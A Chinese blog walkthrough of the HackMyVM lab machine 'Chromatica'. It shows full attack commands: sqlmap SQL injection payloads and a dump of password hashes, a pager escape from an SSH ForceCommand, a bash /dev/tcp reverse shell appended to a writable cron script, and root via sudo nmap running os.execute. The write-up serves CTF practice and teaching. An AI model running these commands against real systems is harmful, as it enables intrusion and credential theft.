---
{"dg-publish":true,"title":"hackmyvm_Chromatica","tags":["blog"],"dg-path":"安全/靶机/hackmyvm_Chromatica.md","permalink":"/安全/靶机/hackmyvm_Chromatica/","dgPassFrontmatter":true}
---

# 主机发现

```sh
┌──(root㉿kali)-[~/workspace/SecLists-master/Passwords]
└─# arp-scan --interface=eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 00:0c:29:8e:b5:fe, IPv4: 192.168.4.4
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.4.1     00:50:56:c0:00:08       VMware, Inc.
192.168.4.2     00:50:56:e9:2d:a9       VMware, Inc.
192.168.4.5     08:00:27:08:b1:5f       PCS Systemtechnik GmbH
192.168.4.254   00:50:56:e4:06:4b       VMware, Inc.

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.442 seconds (104.83 hosts/sec). 4 responded

┌──(root㉿kali)-[~/workspace/SecLists-master/Passwords]
└─# nmap -sT -min-rate 10000 -p- 192.168.4.5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 10:35 EST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 100.00% done; ETC: 10:35 (0:00:00 remaining)
Nmap scan report for 192.168.4.5
Host is up (0.0025s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5353/tcp open  mdns
MAC Address: 08:00:27:08:B1:5F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 18.11 seconds

```


开了三个端口

5353端口那个没怎么见过，去搜了一下
**端口5353专用于多播域名系统（MDN）协议，该协议使您可以在没有DNS服务器的小型网络中解决IP地址。**





# web渗透

目录扫描
```sh
┌──(root㉿kali)-[~/workspace/pentest/Chromatica]
└─# dirb http://192.168.4.5/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat Feb 15 10:40:54 2025
URL_BASE: http://192.168.4.5/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.4.5/ ----
==> DIRECTORY: http://192.168.4.5/assets/
==> DIRECTORY: http://192.168.4.5/css/
+ http://192.168.4.5/index.html (CODE:200|SIZE:4047)
==> DIRECTORY: http://192.168.4.5/javascript/
==> DIRECTORY: http://192.168.4.5/js/
+ http://192.168.4.5/robots.txt (CODE:200|SIZE:36)
+ http://192.168.4.5/server-status (CODE:403|SIZE:276)

---- Entering directory: http://192.168.4.5/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.4.5/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.4.5/javascript/ ----
==> DIRECTORY: http://192.168.4.5/javascript/jquery/

---- Entering directory: http://192.168.4.5/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.4.5/javascript/jquery/ ----
+ http://192.168.4.5/javascript/jquery/jquery (CODE:200|SIZE:288550)

-----------------
END_TIME: Sat Feb 15 10:41:19 2025
DOWNLOADED: 13836 - FOUND: 4

```

![Pasted image 20250215234353.png](/img/user/picture/Pasted%20image%2020250215234353.png)

看一下有没有漏洞可以利用
![Pasted image 20250215234428.png](/img/user/picture/Pasted%20image%2020250215234428.png)

这一个好像不行
```sh
msf6 exploit(windows/http/umbraco_upload_aspx) > run
[*] Started reverse TCP handler on 192.168.4.4:4444
[*] Uploading 373628 bytes through /umbraco/webservices/codeEditorSave.asmx...
[*] Uploading to /umbraco/vmAIYVfqDuC.aspx
[*] Didn't get the expected 500 error code /umbraco/webservices/codeEditorSave.asmx [500 Not Found]. Trying to execute the payload anyway
[*] Executing /umbraco/vmAIYVfqDuC.aspx...
[-] Execution failed on /umbraco/vmAIYVfqDuC.aspx [404 Not Found]
[*] Exploit completed, but no session was created.

```

没找到可以利用的漏洞。。。

看一下敏感文件
```sh
┌──(root㉿kali)-[~]
└─# curl http://192.168.4.5/robots.txt
user-agent: dev
Allow: /dev-portal/
```
![Pasted image 20250216104434.png](/img/user/picture/Pasted%20image%2020250216104434.png)
是一个搜索界面

看一下这个目录下还有没有其他文件
```sh
┌──(root㉿kali)-[~]
└─# dirb http://192.168.4.5/dev-portal/ -a dev -X .php,.html,.txt,.zip

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat Feb 15 21:47:36 2025
URL_BASE: http://192.168.4.5/dev-portal/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
USER_AGENT: dev
EXTENSIONS_LIST: (.php,.html,.txt,.zip) | (.php)(.html)(.txt)(.zip) [NUM = 4]

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.4.5/dev-portal/ ----
+ http://192.168.4.5/dev-portal/index.html (CODE:200|SIZE:527)
+ http://192.168.4.5/dev-portal/login.php (CODE:200|SIZE:609)
+ http://192.168.4.5/dev-portal/search.php (CODE:200|SIZE:844)

-----------------
END_TIME: Sat Feb 15 21:48:05 2025
DOWNLOADED: 18448 - FOUND: 3

```

在首页直接搜索城市的话会访问
```url
http://192.168.4.5/dev-portal/search.php?city=New+York+City
```
![Pasted image 20250216105210.png](/img/user/picture/Pasted%20image%2020250216105210.png)
不加参数的话应该就是把所有结果都显示出来了
![Pasted image 20250216105249.png](/img/user/picture/Pasted%20image%2020250216105249.png)

试一下这个有没有sql注入

```sh
sqlmap -u http://192.168.4.5/dev-portal/search.php?city=111 –-user-agent dev
...
GET parameter 'city' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
---
Parameter: city (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: city=111' AND (SELECT 5262 FROM (SELECT(SLEEP(5)))vcZY) AND 'IvXV'='IvXV

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: city=111' UNION ALL SELECT NULL,NULL,CONCAT(0x7162717071,0x50535465494e685645754c6b4e6f73666151495a4370594146794b634f6e6b74594363634b66494e,0x7162786a71),NULL-- -
---
```


接下来分别查看数据库和表
```sh
┌──(root㉿kali)-[~]
└─# sqlmap -u http://192.168.4.5/dev-portal/search.php?city=111 –-user-agent dev  --dbs
...
[23:22:45] [INFO] fetching database names
available databases [2]:
[*] Chromatica
[*] information_schema

┌──(root㉿kali)-[~]
└─# sqlmap -u http://192.168.4.5/dev-portal/search.php?city=111 –-user-agent dev  -D Chromatica --tables

[23:24:12] [INFO] fetching tables for database: 'Chromatica'
Database: Chromatica
[2 tables]
+--------+
| cities |
| users  |
+--------+

┌──(root㉿kali)-[~]
└─# sqlmap -u http://192.168.4.5/dev-portal/search.php?city=111 –-user-agent dev  -D Chromatica -T users --dump
...
[23:26:00] [INFO] cracked password 'keeptrying' for user 'user'
Database: Chromatica
Table: users
[5 entries]
+----+-----------------------------------------------+-----------+-----------------------------+
| id | password                                      | username  | description                 |
+----+-----------------------------------------------+-----------+-----------------------------+
| 1  | 8d06f5ae0a469178b28bbd34d1da6ef3              | admin     | admin                       |
| 2  | 1ea6762d9b86b5676052d1ebd5f649d7              | dev       | developer account for taz   |
| 3  | 3dd0f70a06e2900693fc4b684484ac85 (keeptrying) | user      | user account for testing    |
| 4  | f220c85e3ff19d043def2578888fb4e5              | dev-selim | developer account for selim |
| 5  | aaf7fb4d4bffb8c8002978a9c9c6ddc9              | intern    | intern                      |
+----+-----------------------------------------------+-----------+-----------------------------+

```


尝试破解一下这些密码
https://crackstation.net/
![Pasted image 20250216124647.png](/img/user/picture/Pasted%20image%2020250216124647.png)

```txt
admin/adm!n
dev/flaghere
user/keeptrying
dev-selim
intern/intern00
```

利用这些尝试一下ssh登录

```sh
┌──(root㉿kali)-[~/workspace/SecLists-master/Passwords]
└─# ssh dev@192.168.4.5
The authenticity of host '192.168.4.5 (192.168.4.5)' can't be established.
ED25519 key fingerprint is SHA256:+czsuAWX6K/5Q5qXxqH5/OquiT/4/G1bJTK0Urs9Z2E.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.4.5' (ED25519) to the list of known hosts.
dev@192.168.4.5's password:
GREETINGS,
THIS ACCOUNT IS NOT A LOGIN ACCOUNT
IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
REGARDS

brightctf{ALM0ST_TH3R3_34897ffdf69}
Connection to 192.168.4.5 closed.

```

上面那个登录页面还没用
emmm，都试了一下，还是什么东西都没有
仔细研究了一下别人的wp
![Pasted image 20250216131832.png](/img/user/picture/Pasted%20image%2020250216131832.png)
也就是说他这个是用more来输出的，如果我们缩小终端大小，他就会类似于在中间卡住，这时候我们就可以启用一个shell
![Pasted image 20250216132102.png](/img/user/picture/Pasted%20image%2020250216132102.png)
![Pasted image 20250216132122.png](/img/user/picture/Pasted%20image%2020250216132122.png)
第一次做到这种，感觉很神奇

```sh
dev@Chromatica:~$ id
uid=1001(dev) gid=1001(dev) groups=1001(dev)
dev@Chromatica:~$ ls
bye.sh  hello.txt  snap  user.txt
dev@Chromatica:~$ cat user.txt
brightctf{ONE_OCKLOCK_8cfa57b4168}
```


# 提权

看一下`.bash_history`
![Pasted image 20250216133609.png](/img/user/picture/Pasted%20image%2020250216133609.png)
![Pasted image 20250216133859.png](/img/user/picture/Pasted%20image%2020250216133859.png)
e,这里是不是作者在做测试留下的


```sh
* *     * * *   analyst /bin/bash /opt/scripts/end_of_day.sh
```
有修改权限
```sh
dev@Chromatica:/opt/scripts$ ls -l
total 4
-rwxrwxrw- 1 analyst analyst 30 Feb 16 05:00 end_of_day.sh
```
反弹shell
```sh
dev@Chromatica:/opt/scripts$ echo '/bin/bash -i >& /dev/tcp/192.168.4.4/1234 0>&1' >> end_of_day.sh
dev@Chromatica:/opt/scripts$ cat end_of_day.sh
#this is my end of day script
/bin/bash -i >& /dev/tcp/192.168.4.4/1234 0>&1
```

```sh
┌──(root㉿kali)-[~]
└─# nc -lvnp 1234
listening on [any] 1234 ...
id
connect to [192.168.4.4] from (UNKNOWN) [192.168.4.5] 48442
bash: cannot set terminal process group (3373): Inappropriate ioctl for device
bash: no job control in this shell
analyst@Chromatica:~$ id
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
analyst@Chromatica:~$ cat analyst.txt
cat analyst.txt
brightctf{GAZETTO_RUKI_b2f4f50f398}

```

emmm,在新用户里面`.bash_history`也看到了有意思的东西

![Pasted image 20250216134233.png](/img/user/picture/Pasted%20image%2020250216134233.png)
```sh
analyst@Chromatica:~$ sudo -l
sudo -l
Matching Defaults entries for analyst on Chromatica:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User analyst may run the following commands on Chromatica:
    (ALL : ALL) NOPASSWD: /usr/bin/nmap
analyst@Chromatica:~$ TF=$(mktemp)
TF=$(mktemp)
analyst@Chromatica:~$ echo 'os.execute("/bin/sh")' > $TF
echo 'os.execute("/bin/sh")' > $TF
analyst@Chromatica:~$ sudo nmap --script=$TF
id
uid=0(root) gid=0(root) groups=0(root)
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@Chromatica:/home/analyst# id
id
uid=0(root) gid=0(root) groups=0(root)
root@Chromatica:~# cat root.txt
cat root.txt
brightctf{DIR_EN_GREY_59ce1d6c207}
```
果然如`.bash_history`提示一样

```sh
root@Chromatica:~# su - dev -c "/bin/bash -l"
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
dev@Chromatica:~$

```


# sshd配置之ForceCommand

在目录`/etc/ssh/sshd_config.d`下有这么一个配置文件
`dev_config.conf`
```sh
root@Chromatica:/etc/ssh/sshd_config.d# cat dev_config.conf
Match User dev
ForceCommand /home/dev/bye.sh
```
首先`/etc/ssh/sshd_config.d` 是 OpenSSH 服务器（`sshd`）的**配置片段目录**，用于存放额外的配置文件

 **`ForceCommand /home/dev/bye.sh`**
- **强制执行的命令**  
    无论用户 `dev` 登录后尝试执行什么操作（如启动 shell、运行命令等），**都会被强制替换为执行脚本 `/home/dev/bye.sh`**。

也就是假设用户 `dev` 尝试通过 SSH 登录并执行命令：

```sh
ssh dev@your-server "ls -l /"
```

实际执行的命令会被替换为：

```sh
/home/dev/bye.sh
```

用户无法执行 `ls -l /`，也**无法获得交互式 Shell**（除非脚本 `bye.sh` 主动启动 Shell）。








